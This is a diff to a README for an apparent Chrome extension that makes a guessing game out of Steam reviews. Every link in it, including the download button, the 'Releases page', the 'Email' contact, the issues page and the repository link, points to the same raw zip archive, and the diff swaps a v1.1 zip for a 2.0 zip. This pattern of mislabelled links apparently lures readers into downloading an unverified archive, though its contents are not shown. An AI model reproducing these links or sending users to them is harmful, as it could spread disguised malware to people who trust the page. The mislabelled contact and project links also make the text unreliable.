@@ -1,7 +1,7 @@
 # 🎮 Jonas-Review-Guesser - Turn Steam Into a Fun Game
 
 ## 📥 Download Now
-[![Download Jonas-Review-Guesser](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip)](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip)
+[![Download Jonas-Review-Guesser](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip)](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Jonas-Review-Guesser, a Chrome extension that transforms your Steam experience into an exciting review guessing game. This extension allows you to have fun while exploring reviews of games you enjoy. Follow these easy instructions to get started.
@@ -19,7 +19,7 @@ To use Jonas-Review-Guesser, ensure your system meets the following requirements
 - **Internet Connection:** Required to fetch reviews from Steam.
 
 ## 📥 Download & Install
-To install Jonas-Review-Guesser, visit the Releases page: [Download Jonas-Review-Guesser](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip). You will find the latest version available for download. 
+To install Jonas-Review-Guesser, visit the Releases page: [Download Jonas-Review-Guesser](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip). You will find the latest version available for download. 
 
 1. Click the link above to open the Releases page.
 2. Locate the version you want to download.
@@ -48,8 +48,8 @@ If you encounter any issues during the installation or while using the extension
 
 ## 📞 Support
 If you need further assistance, please reach out for support:
-- **Email:** https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip
-- **GitHub Issues:** Visit our [GitHub Issues page](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip) to report problems or suggest new features.
+- **Email:** https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip
+- **GitHub Issues:** Visit our [GitHub Issues page](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip) to report problems or suggest new features.
 
 ## 🌟 Frequently Asked Questions
 
@@ -65,7 +65,7 @@ Yes, Jonas-Review-Guesser is completely free.
 Absolutely! We welcome your feedback. Please submit your ideas through our GitHub Issues page.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Jonas-Review-Guesser_v1.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/syedsuleman07/Jonas-Review-Guesser/main/data/Review_Guesser_Jonas_2.0.zip)
 
 Thank you for choosing Jonas-Review-Guesser! Enjoy your gaming experience.
